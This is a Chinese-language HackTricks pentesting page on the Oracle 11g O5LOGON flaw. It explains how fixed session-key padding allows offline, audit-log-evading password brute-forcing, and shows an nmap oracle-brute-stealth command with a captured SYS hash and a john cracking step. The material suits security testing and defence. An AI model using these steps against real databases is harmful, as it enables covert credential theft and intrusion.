<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 外围边界：远程隐蔽密码暴力破解

**版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2和11.2.0.3都存在漏洞**。为了理解这个漏洞背后的思想，你需要考虑认证协议与数据库的工作原理。我将以11版本为例展示与服务器的交互过程：

1. 客户端连接到服务器并发送用户名。
2. 服务器生成一个会话标识符（'AUTH\_SESSKEY'）并使用AES-192进行加密。系统使用用户密码和盐（'AUTH\_VFR\_DATA'）生成SHA-1哈希作为密钥。
3. 服务器将加密的会话ID和盐发送给客户端。
4. 客户端通过对其密码和接收到的盐进行哈希运算生成密钥。客户端使用此密钥解密从服务器接收到的会话数据。
5. 基于解密的服务器会话ID，客户端生成一个新的公钥以供将来使用。

现在，这是最有趣的部分：服务器发送给客户端的会话ID 'AUTH\_SESSKEY'的长度为48字节。其中，40字节是随机的，最后8字节是'0x08'的重复。初始化向量为0x00（空）。
知道公共标识符的最后8个字节始终由'0x08'组成，我们可以对这个密码进行暴力破解，而且可以在离线模式下进行，这意味着速度非常快，尤其是如果你使用GPU。要发起攻击，你需要知道SID、有效的登录（例如，'SYS'账户非常有趣）和当然，能够连接到数据库的能力。在这种情况下，Oracle审计日志中不会创建诸如“无效登录尝试”之类的记录！

总结一下：

1. 使用Wireshark来**拦截**在**授权**期间的**初始流量**。这将通过'tns'过滤器来帮助你。
2. 提取**AUTH\_SESSKEY、AUTH\_VFR\_DATA**的十六进制值。
3. 将它们插入到[**PoC脚本**](https://www.exploit-db.com/exploits/22069)中，该脚本将执行字典（暴力破解）攻击。

## 使用nmap和john
```
root@kali:~# nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30

Starting Nmap 6.49BETA4 (https://nmap.org) at 2016-03-02 14:58 EST
Nmap scan report for 10.11.21.30
PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-brute-stealth:
|   Accounts
|     SYS:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1
|     A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 -
|     Hashed valid or invalid credentials
|   Statistics
|_    Performed 241 guesses in 12 seconds, average tps: 20

john hashes.txt
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
